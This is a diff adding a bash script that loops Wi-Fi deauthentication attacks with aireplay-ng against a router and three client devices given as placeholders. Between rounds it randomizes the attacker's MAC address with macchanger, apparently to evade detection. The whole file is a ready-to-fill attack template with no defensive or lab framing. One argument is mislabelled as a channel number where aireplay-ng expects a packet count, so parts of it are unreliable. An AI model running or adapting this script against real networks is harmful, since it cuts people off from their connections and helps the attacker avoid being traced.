@@ -1,0 +1,25 @@
+let "a=0"
+while true
+do
+if [ $a -le 1 ];
+then
+aireplay-ng -0 (channel no.) -a (mac address of the router) -c (mac address of the client 1)  (interface name)
+elif [ $a -ge 2 -a $a -le 3 ];
+then
+aireplay-ng -0 (channel no.) -a (mac address of the router) -c (mac address of the client 2)  (inteface name)
+elif [ $a -ge 4 -a $a -le 5 ];
+then
+aireplay-ng -0 (channel no.) -a (mac address of the router) -c (mac address of the client 3)  (inteface name)
+else
+let "a=-1"
+fi
+ifconfig (inteface name) down
+macchanger -r (inteface name) | grep "New MAC"
+iwconfig (inteface name) mode monitor
+ifconfig (inteface name) up
+sleep 3
+echo $a
+let "a++"
+done
+
+
